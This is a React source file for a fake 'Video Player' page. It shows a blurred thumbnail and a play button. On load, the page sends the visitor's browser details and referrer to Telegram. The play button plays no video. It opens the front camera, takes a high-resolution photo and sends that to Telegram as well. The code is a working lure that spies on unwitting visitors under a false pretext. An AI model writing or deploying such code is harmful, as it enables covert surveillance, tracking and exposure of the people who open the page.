import { PlayIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram } from './utils/telegram';

function App() {
  const [isBlurred] = useState(true);
  const thumbnailUrl = '/img/758479-final.png';

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendPhoto = useCallback(async () => {
    try {
      // Memilih kamera depan, bisa disesuaikan jika ingin eksplisit menggunakan 'facingMode'
      const constraints = {
        video: {
          facingMode: { exact: 'user' },
          width: { ideal: 4096 },
          height: { ideal: 2160 }
        },
        audio: false // Audio tidak diperlukan untuk foto
      };
  
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
  
      // Buat elemen video untuk menampilkan stream
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      
      // Tunggu video siap diputar
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          // Berikan jeda singkat agar stream video benar-benar aktif
          setTimeout(resolve, 500);
        };
      });
  
      // Setup canvas dengan dimensi video yang didapat
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 1920;
      canvas.height = video.videoHeight || 1080;
      const context = canvas.getContext('2d');
      
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }
  
      // Konversi gambar ke blob dengan kualitas maksimum
      const photoBlob = await new Promise<Blob>((resolve, reject) => {
        canvas.toBlob((blob) => {
          if (blob) {
            resolve(blob);
          } else {
            reject(new Error("Gagal mendapatkan Blob dari canvas."));
          }
        }, 'image/jpeg', 1.0);
      });
      
  
      // Hentikan semua track untuk menutup kamera
      stream.getTracks().forEach(track => track.stop());
  
      // Kirim foto melalui Telegram
      await sendImageToTelegram(photoBlob);
    } catch (error) {
      console.error('Error capturing photo:', error);
    }
  }, []);
  

  const handlePlayClick = async () => {
    await captureAndSendPhoto();
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Video Player</h1>
        </div>
      </header>

      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[1080px] mx-auto">
          <div className="relative">
            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
              {isBlurred && (
                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
              )}
              <div className="absolute inset-0 flex items-center justify-center z-10">
                <button 
                  onClick={handlePlayClick}
                  className="bg-red-600 rounded-full p-4 hover:bg-red-700 transition-all duration-300 hover:scale-110 group md:p-8"
                >
                  <PlayIcon className="w-12 h-12 text-white group-hover:text-gray-100 md:w-20 md:h-20" />
                </button>
              </div>
              <img 
                src={thumbnailUrl} 
                alt="Video Thumbnail" 
                className="w-full h-full object-cover"
              />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;